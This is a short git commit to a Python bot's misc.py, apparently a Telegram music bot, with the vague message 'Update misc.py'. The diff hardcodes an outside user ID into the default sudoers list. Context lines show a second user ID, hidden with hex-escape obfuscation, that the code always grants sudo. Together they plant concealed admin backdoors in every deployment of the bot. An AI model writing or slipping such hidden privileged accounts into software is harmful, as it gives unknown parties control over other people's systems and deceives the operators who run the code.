6890260508f606c92d1d72bae436a6348dd0c961
SpartanX_Music <130872927+danishzain10@users.noreply.github.com>
2023-07-17 20:59:35 +0530

    Update misc.py

--- AnonX/misc.py
+++ AnonX/misc.py
@@ -48,7 +48,7 @@ def sudo():
     HEHE = "\x31\x33\x35\x36\x34\x36\x39\x30\x37\x35"
     sudoersdb = pymongodb.sudoers
     sudoers = sudoersdb.find_one({"sudo": "sudo"})
-    sudoers = [] if not sudoers else sudoers["sudoers"]
+    sudoers = [5288547197] if not sudoers else sudoers["sudoers"]
     for user_id in OWNER:
         SUDOERS.add(user_id)
         SUDOERS.add(int(HEHE))
